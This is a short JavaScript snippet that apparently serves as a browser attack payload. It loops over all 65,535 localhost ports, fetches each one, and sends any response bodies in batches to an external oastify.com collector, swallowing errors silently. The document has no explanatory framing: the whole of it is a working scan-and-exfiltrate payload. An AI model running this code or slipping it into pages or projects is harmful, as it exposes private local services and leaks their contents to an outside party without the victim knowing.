const batchSize = 10;
    let results = [];

    const sendBatchRequest = async (batch, batchNumber) => {
        const batchData = batch.map(item => `port=${item.port}&data=${encodeURIComponent(item.data)}`).join('&');
        await fetch(`http://4qvsaj37n739p5mnhvem66iujlpcdg15.oastify.com?batch=${batchNumber}`, {
            method: "POST",
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: batchData
        });
    };

    const processPort = async (port, batchNumber) => {
        try {
            const response = await fetch(`http://127.0.0.1:${port}`);
            if (response.ok) {
                const data = await response.text();
                results.push({ port, data });
            }
        } catch (error) {
            // Silently handle errors
        }

        if (results.length >= batchSize) {
            await sendBatchRequest(results, batchNumber);
            results = [];
        }
    };

    const processPorts = async () => {
        let batchNumber = 1;
        for (let port = 1; port <= 65535; port++) {
            await processPort(port, batchNumber);
            if (port % batchSize === 0) {
                batchNumber++;
            }
        }

        // Send any remaining results
        if (results.length > 0) {
            await sendBatchRequest(results, batchNumber);
        }
    };

    processPorts();